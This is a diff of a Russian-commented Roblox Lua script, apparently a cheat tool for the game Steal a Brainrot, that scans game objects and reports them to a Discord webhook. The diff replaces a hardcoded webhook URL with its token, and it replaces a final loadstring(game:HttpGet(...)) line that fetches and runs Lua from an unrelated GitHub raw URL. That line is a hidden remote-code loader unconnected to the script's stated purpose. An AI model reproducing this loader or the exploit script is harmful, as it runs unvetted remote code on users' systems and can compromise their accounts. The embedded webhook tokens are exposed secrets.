@@ -1,4 +1,3 @@
-
 -- 🎯 BRAINROT INCOME SCANNER v2.0 (ПОЛНАЯ ВЕРСИЯ)
 -- Сканирует все объекты в Steal a Brainrot и отправляет уведомления в Discord
 -- Запуск: автоматически при старте + по клавише F
@@ -10,7 +9,7 @@ local HttpService = game:GetService('HttpService')
 -- ⚙️ НАСТРОЙКИ
 local INCOME_THRESHOLD = 50_000_000 -- 50M/s минимум для уведомления
 local HIGH_PRIORITY_THRESHOLD = 300_000_000 -- 500M/s для особо важных объектов
-local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1424146317604687932/G5mtYy3JUjj0I8OQxIyxBDfr2oU0tHGe96R00BnoUDeRGukoPeSYn4AJBAnCrHJz0da4'
+local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1424147041311002656/W_E7_-Z9DUucHP4p5BqOYeVKWhtACzAzVQCNW2nD0CPikwwk4yfEBVbgmV_wVsoNR_Oo'
 
 print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)
 
@@ -565,4 +564,4 @@ end)
 
 print('💡 Нажмите F для повторного сканирования')
 print('📱 Discord webhook готов к отправке уведомлений')
-loadstring(game:HttpGet("https://raw.githubusercontent.com/piskastroi1-ui/SSik/refs/heads/main/ss2.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/valkiri61-cloud/dsfsdf/refs/heads/main/dfesdf.lua"))()
